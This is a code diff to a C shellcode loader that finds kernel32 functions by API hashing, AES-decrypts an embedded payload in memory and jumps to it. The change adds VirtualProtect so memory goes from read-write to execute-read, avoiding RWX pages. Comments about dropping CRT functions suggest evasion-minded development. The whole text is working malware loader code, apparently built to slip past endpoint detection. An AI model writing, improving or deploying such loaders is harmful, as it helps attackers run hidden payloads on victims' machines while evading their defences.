@@ -14,6 +14,7 @@
 
 #define KERNEL32DLL_HASH 0x367DC15A
 #define VirtualAlloc_HASH 0xF625556A
+#define VirtualProtect_HASH 0xB40194F8
 
 #define INITIAL_SEED 7
 UINT32 HASHA(_In_ PCHAR string)
@@ -169,13 +170,20 @@ int main() {
 		DWORD flProtect
 	);
 
+	typedef BOOL(WINAPI* fnVirtualProtect) (
+		LPVOID lpAddress,
+		SIZE_T dwSize,
+		DWORD flNewProtect,
+		PDWORD lpflOldProtect
+	);
+
 	// Retrieve the proc address of VirtualAlloc in kernel32.dll. 
 	// We did not have to load kernel32.dll, since the PE loads it at launch anyway
 	HMODULE kernel32_module = get_module_handle_hash(KERNEL32DLL_HASH);
 	fnVirtualAlloc my_virtual_alloc = get_proc_address_hash(kernel32_module, VirtualAlloc_HASH);
 
 	// Allocate memory that has read, write, and execute permission.
-	void* executable_memory = my_virtual_alloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	void* executable_memory = my_virtual_alloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	/* You may have noticed that the check here for whether VirtualAlloc returns NULL is gone.
 	That is because it included a printf, a function not present in the CRT */
 
@@ -184,6 +192,14 @@ int main() {
 
 	// Decrypt the payload in place using AES
 	AES_CBC_decrypt_buffer(&ctx, executable_memory, len);
+
+
+
+	fnVirtualProtect pVirtualProtect = get_proc_address_hash(kernel32_module, VirtualProtect_HASH);
+
+	DWORD old_protect = NULL;
+	pVirtualProtect(executable_memory, len, PAGE_EXECUTE_READ, &old_protect);
+
 
 	((void(*)()) executable_memory)();
 
